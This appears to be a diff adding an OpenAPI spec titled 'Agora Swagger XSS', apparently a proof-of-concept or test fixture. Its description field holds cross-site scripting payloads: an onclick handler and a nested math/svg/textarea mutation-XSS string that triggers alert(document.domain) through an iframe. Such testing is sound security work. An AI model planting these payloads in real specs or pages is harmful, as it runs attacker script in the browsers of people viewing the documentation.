@@ -1,0 +1,7 @@
+openapi: "3.0.0"
+
+info:
+  title: Agora Swagger XSS
+  description:
+    <h1 onclick="alert(1)" style=display:block>test</h1>
+    xss1<math><mi><table><mglyph><svg><mtext><textarea><a title="</textarea><iframe onload='alert(document.domain)'>"></a></textarea></mtext></svg></mglyph></table></mi></math>
